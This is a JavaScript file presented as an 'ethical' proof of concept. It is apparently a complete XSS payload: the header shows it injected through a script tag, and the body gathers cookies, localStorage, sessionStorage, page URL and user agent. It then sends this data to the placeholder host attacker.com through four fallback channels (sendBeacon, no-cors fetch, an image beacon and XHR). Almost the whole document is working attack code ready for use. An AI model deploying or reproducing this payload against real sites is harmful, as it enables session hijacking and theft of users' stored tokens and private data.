/**
 * Ethical Exploration - Session & DOM Storage Exfiltration PoC
 * License: GNU General Public License v3.0 (GPL-3.0)
 * 
 * Usage in HTML / XSS Injection:
 *   <script src="http://attacker.com/stealsessioncookies.js"></script>
 *   OR inline:
 *   <script>(function(){ // payload execution })();</script>
 */

(function () {
  'use strict';

  // Configurable Exfiltration Endpoint
  var EXFIL_URL = 'http://attacker.com/steal_cookies.php';

  // Collect Session Data and Context
  var payload = {
    cookies: document.cookie || 'NO_COOKIES_FOUND_OR_HTTPONLY',
    location: window.location.href,
    origin: window.location.origin,
    referrer: document.referrer || '',
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString(),
    localStorage: (function () {
      try {
        return JSON.stringify(window.localStorage);
      } catch (e) {
        return 'ACCESS_DENIED';
      }
    })(),
    sessionStorage: (function () {
      try {
        return JSON.stringify(window.sessionStorage);
      } catch (e) {
        return 'ACCESS_DENIED';
      }
    })()
  };

  var serializedData = 'data=' + encodeURIComponent(JSON.stringify(payload));

  // Exfiltration Strategy 1: navigator.sendBeacon (Asynchronous, survives page navigation/unload)
  if (navigator.sendBeacon) {
    var beaconBlob = new Blob([serializedData], {
      type: 'application/x-www-form-urlencoded; charset=UTF-8'
    });
    if (navigator.sendBeacon(EXFIL_URL, beaconBlob)) {
      return;
    }
  }

  // Exfiltration Strategy 2: Modern fetch API with no-cors mode
  if (window.fetch) {
    window.fetch(EXFIL_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: serializedData
    }).catch(function () {});
  }

  // Exfiltration Strategy 3: Dynamic Image Beacon (Bypasses SOP/CORS restrictions for GET pings)
  var img = new Image();
  img.src = EXFIL_URL + '?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(window.location.href);

  // Exfiltration Strategy 4: Fallback XMLHttpRequest
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', EXFIL_URL, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(serializedData);
  } catch (e) {}
})();
